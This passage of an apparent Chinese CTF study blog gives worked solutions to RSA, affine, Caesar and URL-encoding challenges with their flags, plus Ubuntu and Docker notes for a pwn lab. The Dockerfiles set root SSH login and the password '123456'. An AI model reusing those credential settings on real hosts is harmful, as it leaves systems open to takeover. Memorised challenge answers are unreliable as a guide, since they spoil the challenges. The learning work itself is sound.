class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from math import gcd </span><br><span class="line">from sympy import mod_inverse </span><br><span class="line">n1 = 9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327 </span><br><span class="line">n2 = 13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</span><br><span class="line">c = 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588 </span><br><span class="line"></span><br><span class="line">e = 65537 </span><br><span class="line"></span><br><span class="line">p = gcd(n1, n2) # 计算gcd(n1, n2) </span><br><span class="line"></span><br><span class="line">if p &gt; 1: </span><br><span class="line">print(f&quot;发现共享素因数 p = &#123;p&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 计算另一个素因数 </span><br><span class="line">q1 = n1 // p </span><br><span class="line">q2 = n2 // p </span><br><span class="line"></span><br><span class="line"># 计算φ(n) </span><br><span class="line">phi_n1 = (p - 1) * (q1 - 1) </span><br><span class="line">phi_n2 = (p - 1) * (q2 - 1) </span><br><span class="line"></span><br><span class="line"># 计算私钥d </span><br><span class="line">d1 = mod_inverse(e, phi_n1) </span><br><span class="line">d2 = mod_inverse(e, phi_n2) </span><br><span class="line"></span><br><span class="line"># 解密 </span><br><span class="line">m1 = pow(c, d1, n1) </span><br><span class="line">m2 = pow(c, d2, n2) </span><br><span class="line"></span><br><span class="line"># 转换为ASCII </span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;) </span><br><span class="line">return   m_bytes.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) </span><br><span class="line">flag1 = num_to_ascii(m1)</span><br><span class="line">flag2 = num_to_ascii(m2) </span><br><span class="line">print(f&quot;flag1 = &#123;flag1&#125;&quot;) </span><br><span class="line">print(f&quot;flag2 = &#123;flag2&#125;&quot;)</span><br><span class="line">else: </span><br><span class="line">print(&quot;未发现共享素因数，需要其他方法分解模数&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现共享素因数 p &#x3D; 1564859779720039565508870182569324208117555667917997801104862601098933699462849007879184203051278194180664616470669559575370868384820368930104560074538872199213236203822337186927275879139590248731148622362880471439310489228147093224418374555428793546002109</p><p>flag1 &#x3D; TZCFlag{I_love_rsa}</p><p>flag2 &#x3D; SN96LdJnS}%?;Z#:n,zzpQ4&#96;9Jv#a?MZ”HZHj</p><p>q审_Pd,&#x3D;R&lt;w^y(iGma,84&gt;uԌUE!t&#x3D;턢u’Q9ݩ}g<br>2.H*~Sm:!eDA</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>p,q,e</title>
      <link href="/2025/06/ca93d03320bb.html"/>
      <url>/2025/06/ca93d03320bb.html</url>
      
        <content type="html"><![CDATA[<p>在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17<br>求解出d作为flga提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p=473398607161</span><br><span class="line">q=4511491</span><br><span class="line">e=17</span><br><span class="line">z=(p-1)*(q-1) #欧拉函数</span><br><span class="line">d = pow(e, -1, z) #(e * d) % z == 1 </span><br><span class="line">#m = pow(c, d, n)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 473398607161 </span><br><span class="line">q = 4511491 </span><br><span class="line">e = 17 </span><br><span class="line">z = (p - 1) * (q - 1) </span><br><span class="line">d = gmpy2.invert(e, z) # e*d mod z = 1</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p><img src="/images/398FE444-FE62-474E-8333-9D51EDA83FEB.png"><br>右键<br><img src="/images/Pastedimage20250603090548.png"><br>125631357777427553</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>eg1</title>
      <link href="/2025/06/c6778b7d8e59.html"/>
      <url>/2025/06/c6778b7d8e59.html</url>
      
        <content type="html"><![CDATA[<p>WGRMcdt{Rxqtsdgncdghxqz}<br>a&#x3D;7,b&#x3D;3<br><img src="/images/FE5A1AA8-8C8C-4C9E-9A01-0878584AC108.png"><br>TZCFlag{Congratulations}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 仿射密码(Affine Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>p,q,e,c</title>
      <link href="/2025/06/34720d94c3a3.html"/>
      <url>/2025/06/34720d94c3a3.html</url>
      
        <content type="html"><![CDATA[<p>p &#x3D; 3487583947589437589237958723892346254777<br>q &#x3D; 8767867843568934765983476584376578389<br>e &#x3D; 65537<br>cipher &#x3D; 26369494845903294944045520286034018329014599704760363106090278637665342700044</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from sympy import mod_inverse</span><br><span class="line">e = 65537</span><br><span class="line">p = 3487583947589437589237958723892346254777</span><br><span class="line">q = 8767867843568934765983476584376578389</span><br><span class="line">cipher = 26369494845903294944045520286034018329014599704760363106090278637665342700044</span><br><span class="line"></span><br><span class="line">n = p * q #计算模数</span><br><span class="line">phi_n = (p - 1) * (q - 1) #计算欧拉函数</span><br><span class="line"></span><br><span class="line">d = mod_inverse(e, phi_n) #计算私钥d=e^-1 mod ϕ(n)</span><br><span class="line"></span><br><span class="line">m = pow(cipher, d, n) #m=cipher^d mod n使用 pow 函数进行模幂运算，效率更高</span><br><span class="line"></span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">    # 将数字转换为字节流</span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;)</span><br><span class="line">    # 将字节流转换为 ASCII 字符串</span><br><span class="line">    return m_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">flag = num_to_ascii(m)</span><br><span class="line">print(f&quot;flag = &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure><p> flag&#x3D;TZCFlag{try_rsa}<br><img src="/images/Pastedimage20250603143947.png">）</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Url编码</title>
      <link href="/2025/06/fd640f926f7d.html"/>
      <url>/2025/06/fd640f926f7d.html</url>
      
        <content type="html"><![CDATA[<p>%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d<br>flag{and 1&#x3D;1}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变异凯撒</title>
      <link href="/2025/06/ecdefcda6b13.html"/>
      <url>/2025/06/ecdefcda6b13.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250601180351.png"><br><img src="/images/Pastedimage20250601180858.png"><br>ASCII码值<br>f–&gt;102<br>l–&gt;108<br>a–&gt;97<br>g–&gt;103<br><img src="/images/Pastedimage20250601180916.png"><br>每对一位字母进行加密，偏移量依次增加1<br>编写Python代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">txt=&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;</span><br><span class="line">start=5</span><br><span class="line">for i in txt:</span><br><span class="line">    print(chr(ord(i)+start),end=&#x27;&#x27;)</span><br><span class="line">    start+=1</span><br></pre></td></tr></table></figure><p>flag{Caesar_variation}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>看我回旋踢</title>
      <link href="/2025/06/03b0b68e120a.html"/>
      <url>/2025/06/03b0b68e120a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250601021138.png"><br>观察这串密文，我们可以发现开头正好四个字母，并且跟着个括号，这和flag｛｝非常相像，而且题目给我们提示“回旋” 由此我们可以推断出synt是flag经过移位后得到的，这就是凯撒密码。凯撒密码首先选定一个移位数n，比如n&#x3D;3，那么a经过加密后就是d。所以我们在这道题中应该先推测出移位数，s-&gt;f数13次后便得到f，因此移位数就是13，我们可以从网上找到转换器得到结果</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>apt源</title>
      <link href="/2025/06/361421438fe1.html"/>
      <url>/2025/06/361421438fe1.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Types: deb</span><br><span class="line">URIs: http://mirrors.ustc.edu.cn/ubuntu/</span><br><span class="line">Suites: noble noble-updates noble-security</span><br><span class="line">Components: main restricted universe multiverse</span><br><span class="line">Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关闭自动更新</title>
      <link href="/2025/06/2afd25c5206a.html"/>
      <url>/2025/06/2afd25c5206a.html</url>
      
        <content type="html"><![CDATA[<p><code>sudo nano /etc/apt/apt.conf.d/20auto-upgrades</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APT::Periodic::Update-Package-Lists &quot;0&quot;;</span><br><span class="line">APT::Periodic::Download-Upgradeable-Packages &quot;0&quot;;</span><br><span class="line">APT::Periodic::AutocleanInterval &quot;0&quot;;</span><br><span class="line">APT::Periodic::Unattended-Upgrade &quot;0&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>配置静态ip</title>
      <link href="/2025/06/9b9404168e74.html"/>
      <url>/2025/06/9b9404168e74.html</url>
      
        <content type="html"><![CDATA[<p>sudo -i #root用户<br> ls -l &#x2F;etc&#x2F;netplan<br><img src="/images/Pastedimage20250601205045.png"><br>sudo chmod 600 &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #修改文件权限<br>sudo nano &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #更新配置文件内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      addresses: [192.168.142.132/24]         # 设置静态IP地址和掩码</span><br><span class="line">      routes:</span><br><span class="line">        - to: default</span><br><span class="line">          via: 192.168.142.2</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: [114.114.114.114,8.8.8.8]  # 设置主、备DNS</span><br><span class="line">      dhcp4: false                            # 禁用dhcp</span><br></pre></td></tr></table></figure><p>sudo netplan apply  #应用更改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#验证配置</span><br><span class="line">ip a show ens33</span><br><span class="line">ping -c 4 8.8.8.8   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#确保SSH服务正常运行</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">sudo systemctl enable ssh</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250601213334.png"></p><h4 id="使用-SSH-密钥登录（最安全）"><a href="#使用-SSH-密钥登录（最安全）" class="headerlink" title="使用 SSH 密钥登录（最安全）"></a><strong>使用 SSH 密钥登录（最安全）</strong></h4><ol><li>在物理机生成密钥对：<br> ssh-keygen  # 默认保存到 ~&#x2F;.ssh&#x2F;id_rsa&#x3D;&#x3D;(空密码)&#x3D;&#x3D;<br><img src="/images/Pastedimage20250601214315.png">）</li><li>将公钥复制到虚拟机：<br> scp C:\Users\Rhea.ssh\id_rsa.pub <a href="mailto:&#114;&#x68;&#x65;&#x61;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x34;&#50;&#46;&#49;&#x33;&#50;">rhea@192.168.142.132</a>:~&#x2F;<br><img src="/images/Pastedimage20250601214846.png">）</li><li>直接免密登录：<br><img src="/images/Pastedimage20250601221831.png">）</li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfile</title>
      <link href="/2025/06/90e018bb92d9.html"/>
      <url>/2025/06/90e018bb92d9.html</url>
      
        <content type="html"><![CDATA[<p>20.04:<a href="https://hub.docker.com/r/skysider/pwndocker">https://hub.docker.com/r/skysider/pwndocker</a><br>这个是即用即销的，只有root用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker pull skysider/pwndocker</span><br><span class="line">ctf_name=<span class="string">&quot;pwn_challenge&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> docker run -d \</span><br><span class="line">--<span class="built_in">rm</span> \</span><br><span class="line">-h <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">--name <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">-v ~/Desktop/CTFshow_pwn:/CTFshow_pwn \</span><br><span class="line">-p 23946:23946 \</span><br><span class="line">--cap-add=SYS_PTRACE \</span><br><span class="line">skysider/pwndocker</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -w /CTFshow_pwn -e TERM=xterm-256color -it pwn_challenge bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```bash</span><br><span class="line">FROM ubuntu:24.04</span><br><span class="line"></span><br><span class="line">ARG DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line">#  32 </span><br><span class="line">RUN dpkg --add-architecture i386 &amp;&amp; apt-get -y update</span><br><span class="line"># </span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    vim \</span><br><span class="line">    nano \</span><br><span class="line">    git \</span><br><span class="line">    curl \</span><br><span class="line">    wget \</span><br><span class="line">    sudo \</span><br><span class="line">    netcat-openbsd \</span><br><span class="line">    openssh-server \</span><br><span class="line">    unzip \</span><br><span class="line">    bison \</span><br><span class="line">    flex</span><br><span class="line"># </span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    python3 \</span><br><span class="line">    python3-pip \</span><br><span class="line">    python3-venv \</span><br><span class="line">    python3-dev \</span><br><span class="line">    python3-setuptools</span><br><span class="line"># </span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    build-essential \</span><br><span class="line">    libglib2.0-dev \</span><br><span class="line">    libfdt-dev \</span><br><span class="line">    libpixman-1-dev \</span><br><span class="line">    zlib1g-dev \</span><br><span class="line">    gcc-multilib \</span><br><span class="line">    gdb \</span><br><span class="line">    gdb-multiarch \</span><br><span class="line">    clang \</span><br><span class="line">    lldb \</span><br><span class="line">    make \</span><br><span class="line">    cmake \</span><br><span class="line">    nasm</span><br><span class="line"># </span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    qemu-system-x86 \</span><br><span class="line">    qemu-user \</span><br><span class="line">    qemu-user-binfmt \</span><br><span class="line">    tmux \</span><br><span class="line">    konsole</span><br><span class="line"># 32</span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    lib32z1 \</span><br><span class="line">    libc6-dbg \</span><br><span class="line">    libc6-dbg:i386 \</span><br><span class="line">    libgcc-s1:i386</span><br><span class="line"># enable ssh login</span><br><span class="line">RUN rm -f /etc/service/sshd/down</span><br><span class="line">RUN sed -ri &#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27; /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="line">    sed -ri &#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27; /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri &quot;s/StrictModes yes/StrictModes no/g&quot; /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri &quot;s/UsePAM yes/UsePAM no/g&quot; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"># enable login with password</span><br><span class="line">RUN echo &#x27;PasswordAuthentication yes&#x27; &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"># defaultly we have a user `ubuntu` in the image</span><br><span class="line">RUN echo &quot;ubuntu:123456&quot; | chpasswd &amp;&amp; \</span><br><span class="line">    echo &quot;root:123456&quot; | chpasswd</span><br><span class="line"></span><br><span class="line"># add sudo</span><br><span class="line">RUN usermod -aG sudo ubuntu</span><br><span class="line"></span><br><span class="line"># enable ssh key login</span><br><span class="line">#RUN mkdir /home/ubuntu/.ssh &amp;&amp; \</span><br><span class="line">#    echo &quot;Your ssh key&quot; &gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"># keep container running</span><br><span class="line">RUN echo &quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot; &gt; /root/start.sh</span><br><span class="line">RUN chmod +x /root/start.sh</span><br><span class="line"></span><br><span class="line"># create venv for pip</span><br><span class="line">RUN python3 -m venv /pip_venv &amp;&amp; \</span><br><span class="line">    chown -R ubuntu:ubuntu /pip_venv &amp;&amp; \</span><br><span class="line">    echo &quot;\n\n# pip venv\nsource /pip_venv/bin/activate&quot; &gt;&gt; /home/ubuntu/.bashrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># pwn-related tools</span><br><span class="line">RUN /pip_venv/bin/pip config set global.index-url https://pypi.org/simple &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip config set global.trusted-host pypi.org &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 -U pip &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 --no-cache-dir \</span><br><span class="line">    pwntools \</span><br><span class="line">    ropgadget \</span><br><span class="line">    z3-solver \</span><br><span class="line">    smmap2 \</span><br><span class="line">    apscheduler \</span><br><span class="line">    ropper \</span><br><span class="line">    unicorn \</span><br><span class="line">    keystone-engine \</span><br><span class="line">    capstone \</span><br><span class="line">    angr \</span><br><span class="line">    pebble \</span><br><span class="line">    r2pipe \</span><br><span class="line">    LibcSearcher \</span><br><span class="line">    poetry</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># pwndbg</span><br><span class="line">#RUN git clone https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="line">#    cd pwndbg &amp;&amp; chmod +x setup.sh &amp;&amp; ./setup.sh</span><br><span class="line"></span><br><span class="line"># pwndbg安装 - 使用ubuntu用户</span><br><span class="line">USER ubuntu</span><br><span class="line">RUN mkdir -p /home/ubuntu/tools &amp;&amp; \</span><br><span class="line">    cd /home/ubuntu/tools &amp;&amp; \</span><br><span class="line">    git clone https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="line">    cd pwndbg &amp;&amp; \</span><br><span class="line">    ./setup.sh</span><br><span class="line"></span><br><span class="line">USER root  # 切回root用户以执行后续需要特权的命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CMD [&quot;/root/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 22</span><br></pre></td></tr></table></figure><p>在一个空白文件夹中创建一个名为 <code>Dockerfile</code> 的文件，并写入上述内容，随后运行如下指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t pwnenv_ubuntu24 .</span><br><span class="line">docker run -d \ </span><br><span class="line">-p 25000:22 \ </span><br><span class="line">--name=pwn24 \ </span><br><span class="line">--cap-add=SYS_PTRACE \ </span><br><span class="line">-v ~/Desktop/CTF:/CTF \ </span><br><span class="line">pwnenv_ubuntu24</span><br><span class="line"></span><br><span class="line">docker exec -w /CTF -e TERM=xterm-256color -u ubuntu -it pwn24 bash   #进入容器</span><br></pre></td></tr></table></figure><ul><li><code>-d</code>： 使容器在后台运行</li><li><code>-p 25000:22</code>： 容器的 <code>22</code> 端口映射到本地的 <code>25000</code> 端口</li><li><code>--name=pwn24</code>： 容器名为 <code>pwn24</code></li><li><code>--cap-add=SYS_PTRACE</code>：添加 <code>SYS_PTRACE</code> 权限，允许调试和追踪进程</li><li><code>-v ~/Desktop/CTF:/CTF</code> ： 将本地的 <code>~/Desktop/CTF</code> 目录映射到容器中的 <code>/CTF</code> 目录，这样我们便能在容器内访问到本地文件，而无需将文件重复拷贝进容器中</li><li><code>pwnenv_ubuntu24</code>：创建容器所使用的镜像</li></ul><p><strong>启动问题：打开还是gdb 而不是pwngdb【因为要root用户，user就用以下步骤】</strong><br><img src="/../../../../../images/Pastedimage20250612160927.png"><br><img src="/../../../../../images/Pastedimage20250612161114.png"><br><img src="/../../../../../images/Pastedimage20250612161139.png"><br><img src="/../../../../../images/D339EED4-6AF8-4063-858A-B1FA023C4114.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&quot;pwndbg&quot;</span> 2&gt;/dev/null <span class="comment"># 查找 pwndbg 目录</span></span><br><span class="line"><span class="built_in">cd</span> /pwndbg</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chown</span> -R ubuntu:ubuntu /pwndbg <span class="comment">#赋予目录权限</span></span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>以后启动：<br><code>sudo docker start pwn24 #启动容器</code>                                                                                                                                                                                            </p><p><code>sudo docker exec -w /CTF -e TERM=xterm-256color -u ubuntu -it pwn24 /bin/bash  #进入容器</code></p><p>退出虚拟环境：deactivate           exit</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Docker搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfile</title>
      <link href="/2025/06/746fab68958d.html"/>
      <url>/2025/06/746fab68958d.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用32位基础镜像</span><br><span class="line">FROM --platform=linux/386 i386/ubuntu:20.04</span><br><span class="line"></span><br><span class="line">ARG DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"># 不再需要添加i386架构，基础镜像已为32位</span><br><span class="line"># RUN dpkg --add-architecture i386 &amp;&amp; apt-get -y update</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 基础工具</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    vim \</span><br><span class="line">    git \</span><br><span class="line">    curl \</span><br><span class="line">    wget \</span><br><span class="line">    sudo \</span><br><span class="line">    netcat-openbsd \</span><br><span class="line">    openssh-server \</span><br><span class="line">    unzip \</span><br><span class="line">    bison \</span><br><span class="line">    flex</span><br><span class="line"></span><br><span class="line"># Python工具</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">    python3 \</span><br><span class="line">    python3-pip \</span><br><span class="line">    python3-venv \</span><br><span class="line">    python3-dev \</span><br><span class="line">    python3-setuptools</span><br><span class="line"></span><br><span class="line"># 开发工具链</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">    build-essential \</span><br><span class="line">    libglib2.0-dev \</span><br><span class="line">    #libfdt-dev \</span><br><span class="line">    libpixman-1-dev \</span><br><span class="line">    zlib1g-dev \</span><br><span class="line">    gdb \</span><br><span class="line">    clang \</span><br><span class="line">    lldb \</span><br><span class="line">    make \</span><br><span class="line">    cmake</span><br><span class="line"></span><br><span class="line"># 32位库（适配纯32位系统）</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">    libc6-dbg \</span><br><span class="line">    libgcc-s1 \</span><br><span class="line">    zlib1g  # 32位系统中替代lib32z1的库</span><br><span class="line"></span><br><span class="line"># enable ssh login</span><br><span class="line">RUN rm -f /etc/service/sshd/down</span><br><span class="line">RUN sed -ri &#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27; /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="line">    sed -ri &#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27; /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri &quot;s/StrictModes yes/StrictModes no/g&quot; /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri &quot;s/UsePAM yes/UsePAM no/g&quot; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"># enable login with password</span><br><span class="line">RUN echo &#x27;PasswordAuthentication yes&#x27; &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"># defaultly we have a user `ubuntu` in the image</span><br><span class="line">RUN echo &quot;root:123456&quot; | chpasswd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># enable ssh key login</span><br><span class="line">#RUN mkdir /home/ubuntu/.ssh &amp;&amp; \</span><br><span class="line">#    echo &quot;Your ssh key&quot; &gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"># keep container running</span><br><span class="line">RUN echo &quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot; &gt; /root/start.sh</span><br><span class="line">RUN chmod +x /root/start.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># create venv for pip（改为 root 的虚拟环境）</span><br><span class="line">RUN python3 -m venv /pip_venv &amp;&amp; \</span><br><span class="line">    echo &quot;\n\n# pip venv\nsource /pip_venv/bin/activate&quot; &gt;&gt; /root/.bashrc  # 改到 root 的 bashrc</span><br><span class="line">    </span><br><span class="line"># 安装编译依赖（放在安装pwn工具的RUN指令之前）</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">    build-essential \</span><br><span class="line">    gcc-10 g++-10 \  </span><br><span class="line">    libssl-dev \</span><br><span class="line">    rustc cargo \     </span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/* \</span><br><span class="line">    # 切换默认GCC为10版本（支持c++20）</span><br><span class="line">    &amp;&amp; update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-10 100 \</span><br><span class="line">    &amp;&amp; update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-10 100</span><br><span 